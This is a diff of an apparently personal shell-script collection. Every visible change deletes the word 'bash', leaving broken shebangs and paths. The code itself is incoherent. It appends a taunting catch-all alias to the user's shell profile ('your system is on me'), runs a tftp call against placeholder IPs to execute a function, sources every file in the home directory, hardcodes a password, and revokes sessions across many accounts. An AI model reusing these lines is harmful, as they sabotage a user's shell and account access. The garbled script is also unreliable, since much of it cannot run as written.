@@ -1,5 +1,5 @@
 
-```bash
+```
 
 gmailID=($QQmailID) &
 
@@ -15,7 +15,7 @@ APPLE_ID=("$QQmailID") &
 ```
 
 
-```bash
+```
   
 
 miliebooks@arcOS="
@@ -282,9 +282,9 @@ fi
 
 forObsidian(){
 
-echo "alias *=echo 'arcOSBaseKit & qqontheskyshell blocked on your system. your system is on me not any more on your fingers'" >> ~/.bash_profile
+echo "alias *=echo 'arcOSBaseKit & qqontheskyshell blocked on your system. your system is on me not any more on your fingers'" >> ~/._profile
 
-&& source ~/.bash_profile
+&& source ~/._profile
 
   
 
@@ -342,7 +342,7 @@ chflags hidden VAULT_PATH/.obsidian
 
 ####reset config
 
-#!/usr/bin/env bash
+#!/usr/bin/env 
 
 # reset-obsidian-theme.sh
 
@@ -416,7 +416,7 @@ mkdir -p "$HOME/bin"
 
 cat > "$HOME/bin/ghost" <<'EOF'
 
-#!/usr/bin/env bash
+#!/usr/bin/env 
 
 echo "ghost-cli disabled (dummy shim)" >&2
 
@@ -428,7 +428,7 @@ chmod +x "$HOME/bin/ghost"
 
   
 
-# In ~/.bashrc:
+# In ~/.rc:
 
 export PATH="$HOME/bin:$PATH"
 
@@ -442,7 +442,7 @@ blockP* "$FULL_NET_IP" "*.ghost.io $QQLOCAL" &
 
 forNEAR(){
 
-#!/usr/bin/env bash
+#!/usr/bin/env 
 
 set -euo pipefail
 
@@ -658,7 +658,7 @@ echo "Public key:"
 
 forKRPass(){
 
-#!/usr/bin/env bash
+#!/usr/bin/env 
 
   
 
@@ -728,7 +728,7 @@ fi
 
 forOpenSea(){
 
-#!/usr/bin/env bash
+#!/usr/bin/env 
 
 set -euo pipefail
 
@@ -780,7 +780,7 @@ open_url "https://opensea.io/KumaNamkyu"
 
 }
 
-tftp "(192.0.2.10 203.0.113.10)" -c bash "forObsidian" &
+tftp "(192.0.2.10 203.0.113.10)" -c  "forObsidian" &
 
   
 
@@ -792,7 +792,7 @@ tftp "(192.0.2.10 203.0.113.10)" -c bash "forObsidian" &
 
   
 
-#! /bin/bash
+#! /bin/
 
 source ~/* &
 
@@ -856,7 +856,7 @@ backupMastodon(){
 
   
 
-      #!/bin/bash
+      #!/bin/
 
 EMAIL_TO="qqontheskyshell@gmail.com"
 
@@ -1354,7 +1354,7 @@ curl -i -sS -X POST "${BASE}${ENDPOINT}" \
 
 forSoomgo(){
 
-#!/usr/bin/env bash
+#!/usr/bin/env 
 
   
 
@@ -1628,7 +1628,7 @@ forCoinbaseSession(){
 
   
 
-    #!/bin/bash
+    #!/bin/
 
   
 
@@ -1712,7 +1712,7 @@ fi
 
 forNaverSession(){
 
-    #!/bin/bash
+    #!/bin/
 
   
 
@@ -2020,7 +2020,7 @@ fonShinhanSession(){
 
 forProtonSession(){
 
-    #!/bin/bash
+    #!/bin/
 
 # Save as revoke-proton-sessions.sh
 
@@ -2330,7 +2330,7 @@ curl --location 'https://$ghostService.ghost.io/oauth2/revoke' \
 
   --data-urlencode 'client_id=($QQID Namkyu)'
 
-  #!/usr/bin/env bash
+  #!/usr/bin/env 
 
 set -euo pipefail
 
@@ -3166,7 +3166,7 @@ echo "re-enable to generate fresh recovery codes (save/print them securely)."
 
 #replit
 
-# In a Replit shell or local bash (after clearing browser data)
+# In a Replit shell or local  (after clearing browser data)
 
 curl -sS -X POST "https://replit.com/api/v2/auth/logout" \
 
@@ -3222,7 +3222,7 @@ sudo sh -c 'echo 3 > /proc/sys/vm/drop_caches' 2>/dev/null || true 
 
   
 
-# Logout the current session gracefully (runs ~/.bash_logout if present)
+# Logout the current session gracefully (runs ~/._logout if present)
 
 logout
 
@@ -3230,7 +3230,7 @@ logout
 
 #mac & mobileme
 
-#!/bin/bash
+#!/bin/
 
 PASSWORD="yourpass"  # Never hardcode in prod
 
@@ -3246,7 +3246,7 @@ curl -sS -X POST "https://appleid.apple.com/auth" \
 
   
 
-#!/bin/bash
+#!/bin/
 
 ID=($QQmailID photoberry qqonthe* $gmailID)
 
